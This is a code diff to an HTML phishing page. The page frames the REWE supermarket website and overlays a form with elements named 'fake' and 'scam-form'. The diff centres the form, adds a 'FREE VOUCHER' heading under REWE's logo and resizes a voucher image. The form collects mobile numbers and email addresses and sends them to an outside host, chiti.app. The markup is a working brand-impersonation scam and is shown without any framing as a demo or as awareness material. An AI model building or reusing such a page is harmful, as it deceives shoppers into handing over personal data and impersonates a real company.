@@ -14,6 +14,11 @@
           width: 100%;
           height: 100%;
         }
+          
+           h3{
+            text-align: center;
+            color: #c00;
+        }
         
         #fake {
           z-index: 9999;
@@ -22,9 +27,10 @@
         
         #scam-form {
           position: absolute;
-          width: 400px;
-          top: 30vh;
-          left: 30vw;
+          left: 50%;
+          top: 50%;
+          -webkit-transform: translate(-50%, -50%);
+          transform: translate(-50%, -50%);
           background-color: white;
           font-family: arial;
           padding: 1rem;
@@ -62,9 +68,10 @@
       <iframe id="fr" src="https://rewe.de"></iframe>
       <div id="fake">
         <div id="scam-form">
+          <h3>FREE VOUCHER</h3>
           <img src="https://i.rewe-static.de/content/cms/7b00c09f/img/logos/rewe-logo-2016.svg" />
-          <img src="http://2.bp.blogspot.com/-7PSprPolJS0/Uoj-GeXowAI/AAAAAAAABCY/XS0ZQEKZr70/s1600/10pct-nail_art_discount_voucher_code.jpg" width="350" height="150"/>
-          <form action="https://chiti.app" method="GET">
+          <img src="http://2.bp.blogspot.com/-7PSprPolJS0/Uoj-GeXowAI/AAAAAAAABCY/XS0ZQEKZr70/s1600/10pct-nail_art_discount_voucher_code.jpg" width="150" height="55"/>
+            <form action="https://chiti.app" method="GET">
             <input name="mobile" placeholder="Mobile number" />
             <input name="email" placeholder="Email" />
             <button>
